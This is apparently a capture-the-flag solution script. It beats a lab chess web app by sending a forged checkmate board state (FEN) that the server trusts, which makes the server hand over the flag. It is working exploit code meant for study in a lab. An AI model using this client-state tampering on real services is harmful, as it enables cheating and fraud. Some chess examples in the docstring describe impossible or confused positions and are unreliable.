#!/usr/bin/env python3
"""
MazalaChess - Solution

The vulnerability:
  The client sends the board state (FEN) with each move request:
    POST /api/game/move  {"game_id": "...", "move": "e2e4", "fen": "..."}

  The server trusts the client-sent FEN and loads it as the board state.
  So we can send a FEN where white is one move from checkmate,
  plus that checkmate move. Instant win, no chess skill needed.

Steps:
  1. Start a game normally
  2. Inspect network traffic (DevTools -> Network tab)
  3. Notice the "fen" field in the move request
  4. Send a custom FEN with a checkmate-in-1 position + the mating move
  5. Server loads our FEN, applies our move, sees checkmate -> flag

Example checkmate-in-1 position:
  FEN: "rnbqkbnr/ppppp2p/5p2/6pQ/4P3/8/PPPP1PPP/RNB1KBNR w KQkq - 0 1"
  This is a position where Qh5 is already on h5 and Qxe8# is possible,
  but simpler: we use a position where Qh5xf7 is checkmate.

  FEN: "rnbqkbnr/pppp1ppp/8/4p3/2B1P3/8/PPPP1PPP/RNBQK1NR w KQkq - 0 1"
  Move: d1h5 (Qh5) ... then next move f7 is checkmate.

  Even simpler - just send a FEN where it's already checkmate for black:
  FEN: "rnbqkb1r/pppp1Qpp/5n2/4p3/2B1P3/8/PPPP1PPP/RNB1K1NR b KQkq - 0 1"
  (Scholar's Mate position - black is already checkmated)
  The server loads this, sees game is over, white wins -> flag.
"""

import requests
import os

URL = os.environ.get("URL", "http://localhost:5003")

# Step 1: Start a game
r = requests.post(f"{URL}/api/game/start", json={})
data = r.json()
game_id = data["game_id"]
print(f"[*] Game started: {game_id}")

# Step 2: Send a move with a checkmate FEN
# This FEN is Scholar's Mate - black king is checkmated by white queen on f7
checkmate_fen = "rnbqkb1r/pppp1Qpp/5n2/4p3/2B1P3/8/PPPP1PPP/RNB1K1NR b KQkq - 0 4"

r = requests.post(f"{URL}/api/game/move", json={
    "game_id": game_id,
    "move": "e2e4",      # any move, doesn't matter
    "fen": checkmate_fen  # server loads this FEN -> sees checkmate -> flag
})
data = r.json()
print(f"[*] Response: {data}")

if data.get("flag"):
    print(f"\n[!] FLAG: {data['flag']}")
else:
    print("[*] No flag - check the response")
